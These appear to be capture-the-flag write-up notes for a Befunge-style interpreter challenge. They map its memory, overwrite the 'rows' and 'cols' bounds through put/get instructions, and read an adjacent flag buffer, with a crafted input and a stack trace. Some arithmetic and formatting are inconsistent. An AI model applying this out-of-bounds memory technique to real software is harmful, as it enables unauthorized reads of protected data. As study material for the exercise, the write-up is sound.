---

### Memory Layout

```
Stack                       @50c0 – 0x525e   (104 DWORD = 416 bytes)
Board                       @5260 – 0x56aa   (1100 bytes)
Rows                        @56ac – 0x56ae   (4 bytes)
Cols                        @56b0 – 0x56b2   (4 bytes)
Diry                        @56b4 – 0x56b6   (4 bytes)
Pcx                         @56b8 – 0x56ba   (4 bytes)
Pcy                         @56bc – 0x56be   (4 bytes)
do_you_like_gittens         @56c0 – 0x56c2   (4 bytes)
do_gittens_watch_cat_videos @56c4 – 0x56de   (7 DWORD = 28 bytes)
Flag                        @56e0 – 0x5746   (104 bytes)
```

* Accessible bytes from **board**: `1122`

  ```
  50 * 22 + 22 = 1122
  ```

---

### Option 1

```
50 * 22 + 0  = 1100 (@Rows = 0x56ac)
50 * 22 + 4  = 1104 (@Cols = 0x56b0)
```

* Rows = 50 + 2 = 52

* 52 // 22 = 2

* 52 * 22 = 1144 - points into `do_gittens_watch_cat_videos` last DWORD.

* Cols = last_dword + flag_len = (4 + 104) = 108

---

### Option 2

```
50 * 22 + 4 = 1104 (@Cols = 0x56b0)
50 * 22     = 1100
```

* At `do_gittens_watch_cat_videos` last DWORD.
* Cols = before_flag (52) + flag_len (104) = 156

---

### Stack Operations

#### Case `'p'`

Use **put** (`p`) to overwrite array bounds:

* Target: `rows = 52`, `cols = 108`.

#### Case `'g'`

Use **get** (`g`) to read the flag into the stack.

#### Case `'.'`

Use `.` to print stack values.

---

### Before Using `p`

We need to **push indices & value into stack** (since `p` pops values from stack).

To clobber **rows**:

```
stack[n-3] = 52   (value)
stack[n-2] = 0    (x index)
stack[n-1] = 50   (y index)
```

This makes `rows = 52`.

To clobber **cols**:

```
stack[n-3] = 108   (value)
stack[n-2] = 4    (x index)
stack[n-1] = 50   (y index)
```

to makes `cols = 108`

---

### Example Input

```
(First 22 bytes start)
values_to_clobber(4) = chr(52) + chr(8) + chr(50) + chr(108)
input_to_clobber_rows(12) =  '0' + '0' + 'g' + '0' + '!' + ':' + '+' + '0' + 'g' + '0' + '\' + 'p'

input_to_clobber_cols(5) =  '0' + '!' + ':' + ':' + 'v'
(First 22 bytes end)

(Second 22 bytes start)
input_to_clobber_cols(19) = '<' + '+' + '+' + '0' + 'g' + '0' + '!' + ':' + ':' + ':' + '+' + '+' + '+' + '0' + '!' + ':' + '+' + '0' + 'g' + 'p' + 'v'
(second 22 bytes end)

(Third 22 bytes start) # need to reverse this
loop_init(21) = '>' + '0' + '!' + '0' + 'g' + ':' + '0' + '0' + 'g' + 'g' + '.' + '0' + '!' + '+' + '0' + '!' + '0' + 'p' + '>' + '>' + '>' 




---

### Stack Trace



```
# start of clobbering rows = 52
stack(0,0)        sp = 2
stack(52)         sp = 1
stack(52,0)       sp = 2
stack(52,1)       sp = 2
stack(52,1,1)     sp = 3
stack(52,2)       sp = 2
stack(52,2,0)     sp = 3
stack(52,50)      sp = 2  
stack(52,50,0)    sp = 3
stack(52,0,50)    sp = 3  



# end of clobbering rows = 52

# start of clobbering cols = 108
stack(0)            sp = 1
stack(1)            sp = 1
stack(1,1)          sp = 2
stack(1,1,1)        sp = 3
stack(1,2)          sp = 2
stack(3)            sp = 1
stack(3,0)          sp = 2
stack(108)          sp = 1
stack(108,0)        sp = 2
stack(108,1)        sp = 2
stack(108,1,1)      sp = 3
stack(108,1,1,1)    sp = 4
stack(108,1,1,1,1)  sp = 5
stack(108,1,1,2)    sp = 4
stack(108,1,3)      sp = 3
stack(108,4)        sp = 2
stack(108,4,0)      sp = 3
stack(108,4,1)      sp = 3
stack(108,4,1,1)    sp = 4
stack(108,4,2)      sp = 3
stack(108,4,2,0)    sp = 4
stack(108,4,50)     sp = 3

# end of clobbering cols = 108

#loop start
stack(0)            sp = 1
stack(1)            sp = 1
stack(1,0)          sp = 2
stack(8)            sp = 1
stack(8,8)          sp = 2
stack(8,8,0,0)      sp = 4
stack(8,8,52)       sp = 3
stack(8,byte[flag]) sp = 2
stack(8)            sp = 1
stack(8,0)          sp = 2
stack(8,1)          sp = 2
stack(9)            sp = 1
stack(9,0)          sp = 2
stack(9,1)          sp = 2
stack(9,1,0)        sp = 3
#loop end
```


---

